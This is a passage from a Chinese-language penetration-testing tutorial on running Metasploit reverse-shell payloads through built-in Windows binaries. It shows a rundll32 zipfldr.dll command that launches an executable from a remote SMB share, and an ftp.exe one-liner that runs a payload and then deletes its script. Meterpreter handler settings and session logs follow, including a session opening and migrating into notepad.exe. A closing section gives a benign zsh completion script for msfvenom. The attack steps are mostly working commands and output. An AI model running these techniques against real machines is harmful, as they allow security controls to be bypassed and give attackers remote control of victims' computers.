<pre><code class="prism language-c">rundll32<span class="token punctuation">.</span>exe zipfldr<span class="token punctuation">.</span>dll<span class="token punctuation">,</span>RouteTheCall \\<span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span>\share\rev_x86_53_exe<span class="token punctuation">.</span>exe
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010233815907.png#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span><span class="token punctuation">:</span><span class="token number">53</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">179779</span> bytes<span class="token punctuation">)</span> to <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.3</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Meterpreter session <span class="token number">7</span> opened <span class="token punctuation">(</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span><span class="token punctuation">:</span><span class="token number">53</span> ‐<span class="token operator">&gt;</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.3</span><span class="token punctuation">:</span><span class="token number">5245</span><span class="token punctuation">)</span> at
<span class="token number">2019</span>‐<span class="token number">01</span>‐<span class="token number">21</span> <span class="token number">04</span><span class="token punctuation">:</span><span class="token number">55</span><span class="token punctuation">:</span><span class="token number">44</span> ‐<span class="token number">0500</span>

meterpreter <span class="token operator">&gt;</span> getuid
Server username<span class="token punctuation">:</span> John‐PC\John
meterpreter <span class="token operator">&gt;</span> getpid
Current pid<span class="token punctuation">:</span> <span class="token number">6988</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010233806223.png#pic_center" alt="在这里插入图片描述"></p>
<hr>
<h2><a id="1120_Ftpexepayload_2882"></a>11.20 基于白名单Ftp.exe执行payload（十九）</h2>
<pre><code class="prism language-c">Ftp<span class="token punctuation">.</span>exe简介：
</code></pre>
<p>Ftp.exe是Windows本身自带的一个程序，属于微软FTP工具，提供基本的FTP访问。</p>
<p>说明：Ftp.exe所在路径已被系统添加PATH环境变量中，因此，Ftp.exe命令可识别。</p>
<p><strong>Windows 2003 默认位置：</strong></p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\Windows\System32\ftp<span class="token punctuation">.</span>exe
C<span class="token punctuation">:</span>\Windows\SysWOW64\ftp<span class="token punctuation">.</span>exe
</code></pre>
<p><strong>Windows 7 默认位置</strong>：</p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\Windows\System32\ftp<span class="token punctuation">.</span>exe
C<span class="token punctuation">:</span>\Windows\SysWOW64\ftp<span class="token punctuation">.</span>exe
</code></pre>
<p>攻击机： 192.168.1.4 Debian<br>
靶机： 192.168.1.3 Windows 7</p>
<p><strong>配置攻击机msf：</strong></p>
<p>注：需设置参数 set AutoRunScript migrate -f</p>
<pre><code class="prism language-c">msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 
​
Module options <span class="token punctuation">(</span>exploit<span class="token operator">/</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span><span class="token punctuation">:</span> 
​
Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐ 
​
Payload options <span class="token punctuation">(</span>windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp<span class="token punctuation">)</span><span class="token punctuation">:</span>
​
Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
​
EXITFUNC process yes Exit technique <span class="token punctuation">(</span>Accepted<span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span> seh<span class="token punctuation">,</span> thread<span class="token punctuation">,</span> process<span class="token punctuation">,</span> none<span class="token punctuation">)</span>
​
LHOST <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span> yes The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span>
​
LPORT <span class="token number">53</span> yes The listen port 
​
Exploit target<span class="token punctuation">:</span> 
​
Id Name
‐‐ ‐‐‐‐
<span class="token number">0</span> Wildcard Target 
​
msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> set AutoRunScript migrate ‐f
​
AutoRunScript <span class="token operator">=</span><span class="token operator">&gt;</span> migrate ‐f
​
msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010233938331.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
靶机执行：</p>
<pre><code class="prism language-c">echo <span class="token operator">!</span>C<span class="token punctuation">:</span>\Users\John\Desktop\rev_x86_53_exe<span class="token punctuation">.</span>exe <span class="token operator">&gt;</span> o <span class="token operator">&amp;</span>echo quit <span class="token operator">&gt;&gt;</span> o <span class="token operator">&amp;</span>ftp ‐n ‐s<span class="token punctuation">:</span>o <span class="token operator">&amp;</span>del <span class="token operator">/</span>F <span class="token operator">/</span>Q o
</code></pre>
<pre><code class="prism language-c">msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> set AutoRunScript migrate ‐f
AutoRunScript <span class="token operator">=</span><span class="token operator">&gt;</span> migrate ‐f
msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit
​
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span><span class="token punctuation">:</span><span class="token number">53</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">179779</span> bytes<span class="token punctuation">)</span> to <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.3</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Meterpreter session <span class="token number">10</span> opened <span class="token punctuation">(</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span><span class="token punctuation">:</span><span class="token number">53</span> ‐<span class="token operator">&gt;</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.3</span><span class="token punctuation">:</span><span class="token number">5530</span><span class="token punctuation">)</span>
at <span class="token number">2019</span>‐<span class="token number">01</span>‐<span class="token number">21</span> <span class="token number">05</span><span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token number">57</span> ‐<span class="token number">0500</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Session ID <span class="token number">10</span> <span class="token punctuation">(</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span><span class="token punctuation">:</span><span class="token number">53</span> ‐<span class="token operator">&gt;</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.3</span><span class="token punctuation">:</span><span class="token number">5530</span><span class="token punctuation">)</span> processing AutoRunScript <span class="token string">'migrate ‐f'</span>
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Meterpreter scripts are deprecated<span class="token punctuation">.</span> Try post<span class="token operator">/</span>windows<span class="token operator">/</span>manage<span class="token operator">/</span>migrate<span class="token punctuation">.</span>
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Example<span class="token punctuation">:</span> run post<span class="token operator">/</span>windows<span class="token operator">/</span>manage<span class="token operator">/</span>migrate OPTION<span class="token operator">=</span>value <span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Current server process<span class="token punctuation">:</span> rev_x86_53_exe<span class="token punctuation">.</span>exe <span class="token punctuation">(</span><span class="token number">8832</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Spawning notepad<span class="token punctuation">.</span>exe process to migrate to
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Migrating to <span class="token number">8788</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010234022548.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<hr>
<h1><a id="_2971"></a>十二、工具优化分享</h1>
<h2><a id="121_Msfvenom_2972"></a>12.1 解决Msfvenom命令自动补全</h2>
<p><strong>需要zsh的支持：</strong></p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span># cat <span class="token operator">/</span>etc<span class="token operator">/</span>shells
# <span class="token operator">/</span>etc<span class="token operator">/</span>shells<span class="token punctuation">:</span> valid login shells
<span class="token operator">/</span>bin<span class="token operator">/</span>sh
<span class="token operator">/</span>bin<span class="token operator">/</span>dash
<span class="token operator">/</span>bin<span class="token operator">/</span>bash
<span class="token operator">/</span>bin<span class="token operator">/</span>rbash
<span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>screen
<span class="token operator">/</span>bin<span class="token operator">/</span>zsh
<span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>zsh
<span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>tmux
root@John<span class="token punctuation">:</span><span class="token operator">~</span># echo $SHELL
<span class="token operator">/</span>bin<span class="token operator">/</span>bash
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010234452889.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>复制附录A到~/.oh-my-zsh/custom/plugins/msfvenom文件夹下（注：没有msfvenom目录，创建即可）</strong></p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>oh‐my‐zsh<span class="token operator">/</span>custom<span class="token operator">/</span>plugins<span class="token operator">/</span>msfvenom# pwd
<span class="token operator">/</span>root<span class="token operator">/</span><span class="token punctuation">.</span>oh‐my‐zsh<span class="token operator">/</span>custom<span class="token operator">/</span>plugins<span class="token operator">/</span>msfvenom
root@John<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>oh‐my‐zsh<span class="token operator">/</span>custom<span class="token operator">/</span>plugins<span class="token operator">/</span>msfvenom# ls
_msfvenom
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010234515708.png#pic_center" alt="在这里插入图片描述"><br>
编辑~/.zshrc文件：</p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span># nano <span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>zshrc
</code></pre>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span># nano <span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>zshrc
root@John<span class="token punctuation">:</span><span class="token operator">~</span># cat <span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>zshrc
plugins<span class="token operator">=</span><span class="token punctuation">(</span>msfvenom<span class="token punctuation">)</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/2020101023453834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>更新：</strong></p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span># source <span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>zshrc
</code></pre>
<p><strong>效果如下：</strong></p>
<p><img src="https://img-blog.csdnimg.cn/20201010234602991.png#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/2020101023460887.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>附录A：</strong></p>
<pre><code class="prism language-c"><span class="token macro property">#compdef msfvenom</span>
<span class="token macro property">#autoload</span>
#
<span class="token macro property"># zsh completion for msfvenom in Metasploit Framework Project (https://www.metasploit.com)</span>
#
<span class="token macro property"># github: https://github.com/Green‐m/msfvenom‐zsh‐completion</span>
#
<span class="token macro property"># author: Green‐m (greenm.xxoo@gmail.com)</span>
#
<span class="token macro property"># license: GNU General Public License v3.0</span>
#
<span class="token macro property"># Copyright (c) 2018, Green‐m</span>
<span class="token macro property"># All rights reserved.</span>
<span class="token macro property"># 

VENOM_CACHE_FILE=~/.zsh/venom‐cache </span>

venom‐clear‐<span class="token function">cache</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
rm $VENOM_CACHE_FILE
<span class="token punctuation">}</span> 

venom‐cache‐<span class="token function">payloads</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 

<span class="token keyword">if</span> <span class="token punctuation">[</span> ‐x <span class="token string">"$(command ‐v msfvenom)"</span> <span class="token punctuation">]</span>
then
VENOM<span class="token operator">=</span><span class="token string">"msfvenom"</span>
elif <span class="token punctuation">[</span> ‐n <span class="token string">"$_comp_command1"</span> <span class="token punctuation">]</span>
then
VENOM<span class="token operator">=</span>$_comp_command1
<span class="token keyword">else</span>
echo <span class="token string">"Cound not find msfvenom path in system env, please run msfvenom with path."</span>
fi 

<span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token operator">!</span> ‐d $<span class="token punctuation">{</span>VENOM_CACHE_FILE<span class="token punctuation">:</span>h<span class="token punctuation">}</span> <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> then
mkdir ‐p $<span class="token punctuation">{</span>VENOM_CACHE_FILE<span class="token punctuation">:</span>h<span class="token punctuation">}</span>
fi 

<span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token operator">!</span> ‐f $VENOM_CACHE_FILE <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> then
echo ‐n <span class="token string">"(...caching Metasploit Payloads...)"</span>
$VENOM ‐‐list payload<span class="token operator">|</span>grep ‐e <span class="token string">"^.*\/"</span> <span class="token operator">|</span> awk <span class="token string">'{print $1}'</span> <span class="token operator">&gt;&gt;</span>
$VENOM_CA CHE_FILE
fi
<span class="token punctuation">}</span> 

<span class="token function">_msfvenom</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 

local curcontext<span class="token operator">=</span><span class="token string">"$curcontext"</span> state line
typeset ‐A opt_args 

_arguments ‐C \
<span class="token string">'(‐h ‐‐help)'</span><span class="token punctuation">{</span>‐h<span class="token punctuation">,</span>‐‐help<span class="token punctuation">}</span><span class="token string">'[show help]'</span> \
<span class="token string">'(‐l ‐‐list)'</span><span class="token punctuation">{</span>‐l<span class="token punctuation">,</span>‐‐list<span class="token punctuation">}</span>'<span class="token punctuation">[</span>List all modules <span class="token keyword">for</span> type<span class="token punctuation">.</span> Types are<span class="token punctuation">:</span> paylo
ads<span class="token punctuation">,</span> encoders<span class="token punctuation">,</span> nops<span class="token punctuation">,</span> platforms<span class="token punctuation">,</span> archs<span class="token punctuation">,</span> encrypt<span class="token punctuation">,</span> formats<span class="token punctuation">,</span> all<span class="token punctuation">]</span><span class="token string">' \
'</span><span class="token punctuation">(</span>‐p ‐‐payload<span class="token punctuation">)</span><span class="token string">'{‐p,‐‐payload}'</span><span class="token punctuation">[</span>Payload to use <span class="token punctuation">(</span>‐‐list payloads to list<span class="token punctuation">,</span>
‐‐list‐options <span class="token keyword">for</span> arguments<span class="token punctuation">)</span><span class="token punctuation">.</span> Specify ‐ or STDIN <span class="token keyword">for</span> custom<span class="token punctuation">]</span><span class="token string">' \
'</span><span class="token punctuation">(</span>‐‐list‐options<span class="token punctuation">)</span>‐‐list‐options<span class="token punctuation">[</span>List ‐‐payload <span class="token operator">&lt;</span>value<span class="token operator">&gt;</span> standard<span class="token punctuation">,</span> adva
nced and evasion options<span class="token punctuation">]</span><span class="token string">' \
'</span><span class="token punctuation">(</span>‐f ‐‐format<span class="token punctuation">)</span><span class="token string">'{‐f,‐‐format}'</span><span class="token punctuation">[</span>Output format <span class="token punctuation">(</span>use ‐‐list formats to li
st<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token string">' \
'</span><span class="token punctuation">(</span>‐e ‐‐encoder<span class="token punctuation">)</span><span class="token string">'{‐e,‐‐encoder}'</span><span class="token punctuation">[</span>The encoder to use <span class="token punctuation">(</span>use ‐‐list encoders
to list<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token string">' \
'</span><span class="token punctuation">(</span>‐‐smallest<span class="token punctuation">)</span>‐‐smallest<span class="token punctuation">[</span>Generate the smallest possible payload using all
available encoders<span class="token punctuation">]</span><span class="token string">' \
'</span><span class="token punctuation">(</span>‐‐encrypt<span class="token punctuation">)</span>‐‐encrypt<span class="token punctuation">[</span>The type of encryption or encoding to apply to the
shellcode <span class="token punctuation">(</span>use ‐‐list encrypt to list<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token string">' \
'</span><span class="token punctuation">(</span>‐‐encrypt‐key<span class="token punctuation">)</span>‐‐encrypt‐key<span class="token punctuation">[</span>A key to be used <span class="token keyword">for</span> ‐‐encrypt<span class="token punctuation">]</span><span class="token string">' \
'</span><span class="token punctuation">(</span>‐‐encrypt‐iv<span class="token punctuation">)</span>‐‐encrypt‐iv<span class="token punctuation">[</span>An initialization vector <span class="token keyword">for</span> ‐‐encrypt<span class="token punctuation">]</span><span class="token string">' \
'</span><span class="token punctuation">(</span>‐a ‐‐arch<span class="token punctuation">)</span><span class="token string">'{‐a,‐‐arch}'</span><span class="token punctuation">[</span>the architecture to use <span class="token keyword">for</span> ‐‐payload and ‐
‐encoders <span class="token punctuation">(</span>use ‐‐list archs to list<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token string">' \
'</span><span class="token punctuation">(</span>‐‐platform<span class="token punctuation">)</span>‐‐platform<span class="token punctuation">[</span>The platform <span class="token keyword">for</span> ‐‐payload <span class="token punctuation">(</span>use ‐‐list platfo rms
to list<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token string">' \
'</span><span class="token punctuation">(</span>‐o ‐‐out<span class="token punctuation">)</span><span class="token string">'{‐o,‐‐out}'</span><span class="token punctuation">[</span>Save the payload to a file<span class="token punctuation">]</span><span class="token string">' \
'</span><span class="token punctuation">(</span>‐b ‐‐bad‐chars<span class="token punctuation">)</span><span class="token string">'{‐b,‐‐bad‐chars}'</span><span class="token punctuation">[</span>Characters to avoid example<span class="token punctuation">:</span> "\x0
<span class="token number">0</span>\xff"<span class="token punctuation">]</span><span class="token string">' \
'</span><span class="token punctuation">(</span>‐n ‐‐nopsled<span class="token punctuation">)</span><span class="token string">'{‐n,‐‐nopsled}'</span><span class="token punctuation">[</span>Prepend a nopsled of \<span class="token punctuation">[</span>length\<span class="token punctuation">]</span> size on
to the payload<span class="token punctuation">]</span><span class="token string">' \
'</span><span class="token punctuation">(</span>‐‐encoder‐space<span class="token punctuation">)</span>‐‐encoder‐space<span class="token punctuation">[</span>The maximum size of the encoded pay
load <span class="token punctuation">(</span>defaults to the ‐s value<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token string">' \
'</span><span class="token punctuation">(</span>‐i ‐‐iterations<span class="token punctuation">)</span><span class="token string">'{‐i,‐‐iterations}'</span><span class="token punctuation">[</span>The number of times to encode t he
payload<span class="token punctuation">]</span><span class="token string">' \
'</span><span class="token punctuation">(</span>‐c ‐‐add‐code<span class="token punctuation">)</span><span class="token string">'{‐c,‐‐add‐code}'</span><span class="token punctuation">[</span>Specify an additional win32 shellcode
file to include<span class="token punctuation">]</span><span class="token string">' \
'</span><span class="token punctuation">(</span>‐x ‐‐template<span class="token punctuation">)</span><span class="token string">'{‐x,‐‐template}'</span><span class="token punctuation">[</span>Specify a custom executable file to use
as a template<span class="token punctuation">]</span><span class="token string">' \
'</span><span class="token punctuation">(</span>‐k ‐‐keep<span class="token punctuation">)</span><span class="token string">'{‐k,‐‐keep}'</span><span class="token punctuation">[</span>Preserve the ‐‐template behaviour and inject
the payload as a new thread<span class="token punctuation">]</span><span class="token string">' \
'</span><span class="token punctuation">(</span>‐v ‐‐var‐name<span class="token punctuation">)</span><span class="token string">'{‐v,‐‐var‐name}'</span><span class="token punctuation">[</span>Specify a custom variable name to use
<span class="token keyword">for</span> certain output formats<span class="token punctuation">]</span><span class="token string">' \
'</span><span class="token punctuation">(</span>‐t ‐‐timeout<span class="token punctuation">)</span><span class="token string">'{‐t,‐‐timeout}'</span><span class="token punctuation">[</span>The number of seconds to wait when re
ading the payload from STDIN <span class="token punctuation">(</span><span class="token keyword">default</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">0</span> to disable<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token string">' \
'</span><span class="token operator">*</span><span class="token punctuation">:</span> <span class="token punctuation">:</span><span class="token punctuation">(</span>$<span class="token punctuation">(</span>__msfvenom_options<span class="token punctuation">)</span><span class="token punctuation">)</span>' <span class="token operator">&amp;&amp;</span> ret<span class="token operator">=</span><span class="token number">0</span> 

lastword<span class="token operator">=</span>$<span class="token punctuation">{</span>words<span class="token punctuation">[</span>$<span class="token punctuation">{</span>#words<span class="token punctuation">[</span>@<span class="token punctuation">]</span><span class="token punctuation">}</span>‐<span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">}</span> 

<span class="token keyword">case</span> <span class="token string">"$lastword"</span> in
<span class="token punctuation">(</span>‐p<span class="token operator">|</span>‐‐payload<span class="token punctuation">)</span>
_values <span class="token string">'payload'</span> $<span class="token punctuation">(</span>__msfvenom_payloads<span class="token punctuation">)</span>
<span class="token punctuation">;</span><span class="token punctuation">;</span> 

<span class="token punctuation">(</span>‐l<span class="token operator">|</span>‐‐list<span class="token punctuation">)</span>
local lists<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'payloads'</span> <span class="token string">'encoders'</span> <span class="token string">'nops'</span> <span class="token string">'platforms'</span> <span class="token string">'archs'</span> <span class="token string">'encrypt'</span>
<span class="token string">'formats'</span> <span class="token string">'all'</span><span class="token punctuation">)</span>

_values <span class="token string">'list'</span> $lists
<span class="token punctuation">;</span><span class="token punctuation">;</span> 

<span class="token punctuation">(</span>‐encrypt<span class="token punctuation">)</span>
local encrypts<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'aes256'</span> <span class="token string">'base64'</span> <span class="token string">'rc4'</span> <span class="token string">'xor'</span><span class="token punctuation">)</span>
_values <span class="token string">'encrypt'</span> $encrypts
<span class="token punctuation">;</span><span class="token punctuation">;</span> 

<span class="token punctuation">(</span>‐a<span class="token operator">|</span>‐‐arch<span class="token punctuation">)</span>
_values <span class="token string">'arch'</span> $<span class="token punctuation">(</span>__msfvenom_archs<span class="token punctuation">)</span>
<span class="token punctuation">;</span><span class="token punctuation">;</span> 

<span class="token punctuation">(</span>‐platform<span class="token punctuation">)</span>
_values <span class="token string">'platform'</span> $<span class="token punctuation">(</span>__msfvenom_platforms<span class="token punctuation">)</span>
<span class="token punctuation">;</span><span class="token punctuation">;</span>

<span class="token punctuation">(</span>‐f<span class="token operator">|</span>‐‐format<span class="token punctuation">)</span>
_values <span class="token string">'format'</span> $<span class="token punctuation">(</span>__msfvenom_formats<span class="token punctuation">)</span>
<span class="token punctuation">;</span><span class="token punctuation">;</span>

<span class="token punctuation">(</span>‐e<span class="token operator">|</span>‐‐encoder<span class="token punctuation">)</span>
_values <span class="token string">'encoder'</span> $<span class="token punctuation">(</span>__msfvenom_encoders<span class="token punctuation">)</span>
<span class="token punctuation">;</span><span class="token punctuation">;</span> 

<span class="token punctuation">(</span>‐o<span class="token operator">|</span>‐‐out<span class="token operator">|</span>‐x<span class="token operator">|</span>‐‐template<span class="token operator">|</span>‐c<span class="token operator">|</span>‐‐add‐code<span class="token punctuation">)</span>
_files
<span class="token punctuation">;</span><span class="token punctuation">;</span>

<span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span>

<span class="token punctuation">;</span><span class="token punctuation">;</span> 

esac
<span class="token punctuation">}</span> 

<span class="token function">__msfvenom_payloads</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
local msf_payloads 

<span class="token macro property"># we cache the list of packages (originally from the macports plugin)</span>
venom‐cache‐payloads
msf_payloads<span class="token operator">=</span>`cat $VENOM_CACHE_FILE` 

<span class="token keyword">for</span> line in $msf_payloads<span class="token punctuation">;</span> <span class="token keyword">do</span>
echo <span class="token string">"$line"</span>
done
<span class="token punctuation">}</span> 

<span class="token function">__msfvenom_archs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
local archs
archs<span class="token operator">=</span><span class="token punctuation">(</span>
<span class="token string">'aarch64'</span>
<span class="token string">'armbe'</span>
<span class="token string">'armle'</span>
<span class="token string">'cbea'</span>
<span class="token string">'cbea64'</span>
<span class="token string">'cmd'</span>
<span class="token string">'dalvik'</span>
<span class="token string">'firefox'</span>
<span class="token string">'java'</span>
<span class="token string">'mips'</span>
<span class="token string">'mips64'</span>
<span class="token string">'mips64le'</span>
<span class="token string">'mipsbe'</span>
<span class="token string">'mipsle'</span>
<span class="token string">'nodejs'</span>
<span class="token string">'php'</span>
<span class="token string">'ppc'</span>
<span class="token string">'ppc64'</span>
<span class="token string">'ppc64le'</span>
<span class="token string">'ppce500v2'</span>
<span class="token string">'python'</span>
<span class="token string">'r'</span>
<span class="token string">'ruby'</span>
<span class="token string">'sparc'</span>
<span class="token string">'sparc64'</span>
<span class="token string">'tty'</span>
<span class="token string">'x64'</span>
<span class="token string">'x86'</span>
<span class="token string">'x86_64'</span>
<span class="token string">'zarch'</span>
<span class="token punctuation">)</span> 

<span class="token keyword">for</span> line in $archs<span class="token punctuation">;</span> <span class="token keyword">do</span>
echo <span class="token string">"$line"</span>
done 

<span class="token punctuation">}</span> 

<span class="token function">__msfvenom_encoders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
local encoders
encoders<span class="token operator">=</span><span class="token punctuation">(</span>
<span class="token string">'cmd/brace'</span>
<span class="token string">'cmd/echo'</span>
<span class="token string">'cmd/generic_sh'</span>
<span class="token string">'cmd/ifs'</span>
<span class="token string">'cmd/perl'</span>
<span class="token string">'cmd/powershell_base64'</span>
<span class="token string">'cmd/printf_php_mq'</span>
<span class="token string">'generic/eicar'</span>
<span class="token string">'generic/none'</span>
<span class="token string">'mipsbe/byte_xori'</span>
<span class="token string">'mipsbe/longxor'</span>
<span class="token string">'mipsle/byte_xori'</span>
<span class="token string">'mipsle/longxor'</span>
<span class="token string">'php/base64'</span>
<span class="token string">'ppc/longxor'</span>
<span class="token string">'ppc/longxor_tag'</span>
<span class="token string">'ruby/base64'</span>
<span class="token string">'sparc/longxor_tag'</span>
<span class="token string">'x64/xor'</span>
<span class="token string">'x64/xor_dynamic'</span>
<span class="token string">'x64/zutto_dekiru'</span>
<span class="token string">'x86/add_sub'</span>
<span class="token string">'x86/alpha_mixed'</span>
<span class="token string">'x86/alpha_upper'</span>
<span class="token string">'x86/avoid_underscore_tolower'</span>
<span class="token string">'x86/avoid_utf8_tolower'</span>
<span class="token string">'x86/bloxor'</span>
<span class="token string">'x86/bmp_polyglot'</span>
<span class="token string">'x86/call4_dword_xor'</span>
<span class="token string">'x86/context_cpuid'</span>
<span class="token string">'x86/context_stat'</span>
<span class="token string">'x86/context_time'</span>
<span class="token string">'x86/countdown'</span>
<span class="token string">'x86/fnstenv_mov'</span>
<span class="token string">'x86/jmp_call_additive'</span>
<span class="token string">'x86/nonalpha'</span>
<span class="token string">'x86/nonupper'</span>
<span class="token string">'x86/opt_sub'</span>
<span class="token string">'x86/service'</span>
<span class="token string">'x86/shikata_ga_nai'</span>
<span class="token string">'x86/single_static_bit'</span>
<span class="token string">'x86/unicode_mixed'</span>
<span class="token string">'x86/unicode_upper'</span>
<span class="token string">'x86/xor_dynamic'</span>
<span class="token punctuation">)</span>

<span class="token keyword">for</span> line in $encoders<span class="token punctuation">;</span> <span class="token keyword">do</span>
echo <span class="token string">"$line"</span>
done
<span class="token punctuation">}</span> 

